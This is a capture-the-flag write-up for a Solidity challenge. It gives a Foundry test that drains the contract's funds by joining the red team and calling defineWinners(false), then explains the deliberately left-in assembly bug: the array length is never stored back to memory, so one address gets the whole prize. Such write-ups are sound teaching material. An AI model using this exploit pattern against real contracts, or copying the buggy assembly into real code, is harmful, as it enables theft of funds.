# IKnowYulNeverHackThis Solution
Hopefully you picked the winning team in one try. The correct way to steal all of the funds was to join the read team. Here is the solution:
```
function test_GetThisPassing_3() public {
    address hacker = address(0xBAD);
    vm.deal(hacker, 1 ether);


    vm.startPrank(hacker);
    target.joinRedTeam{value: 1 ether}();
    target.defineWinners(false);
    vm.stopPrank();

    assertEq(hacker.balance, 10 ether);
}
```
To win you simply need to:
1. Join the Red Team.

2. Call `defineWinners()` with the paramater set to false.

Winning this challange is fairly easy. However, understanding how you won is far more important. To get a grasp on how joining the red team allows you to win this challenge, lets start by viewing what happens when you join the blue team.

Here is the code from that section with comments explaing each lines utility:
```
// creates an empty address array in memory with a size of one
address[] memory winners = new address[](1);

if (_isBlueTeam) {
    for(uint256 j; j < blueTeam.length; ++j) {
        address winner = blueTeam[j];
        assembly {

            // gets the location of the array in memory
            let location := winners

            // loads the size of the array from memory
            let length := mload(winners)

            // gets the next memory location after the array
            let nextMemoryLocation := add( location, mul( length, 0x20 ) )

            // loads the free memory pointer
            let freeMem := mload(0x40)

            // gets the memory location of the the word after the free memory pointer
            let newMsize := add( freeMem, 0x20 )

            /** 
            if the free memory pointer is not equal to the next available memory location after the array, we need to move each memory variable one word further. This will prevent us from overwritting an existing variable if they exist. (In this scenario they do not exist, but I needed to add more code to throw you off :)
            */
            if iszero( eq( freeMem, nextMemoryLocation) ){
                let currVal
                let prevVal
            
                // loop through the variables that need to be rewritten
                for { let i := nextMemoryLocation } lt(i, newMsize) { i := add(i, 0x20) } {
                    // get the current variables value from meory
                    currVal := mload(i)
                    // store the previous variable in this location
                    mstore(i, prevVal)
                    // save the current value to the stack
                    prevVal := currVal
                
                }
            }

            // store the current winner in the next memory location
            mstore(nextMemoryLocation, winner)

            // increment the length of the array
            length := add( length, 1 )

            // store the updated length to memory
            mstore( location, length )

            // update the free memory pointer
            mstore(0x40, newMsize )
        }
    }
```

We now know the proper way to update the winnings array. Although, addmitidley, there are far more efficient ways to do so for this particular function.

The issue with the version in the else statment (the flow if the red team is the winning team) stems from missing the following line of code:
```
mstore( location, length )
```
Although we do update the `length` variable, we only update it on the stack, and forget to store it in memory. All of the addresses were written to memory, but because the length never gets updated it keeps being rewritten by the next address. We were the last address in the red team array so our address is written to the winnings array at the end of the for loop.

Since the assembly block forgets to update the length of the array, the size is still one. This causes the calculation for the share of winnings to assign the entire balance to `shareOfPrize`. This sends the entirety of the winnings to our address.



Bonus Points if you noticed that the game cannot function properly after the first time.


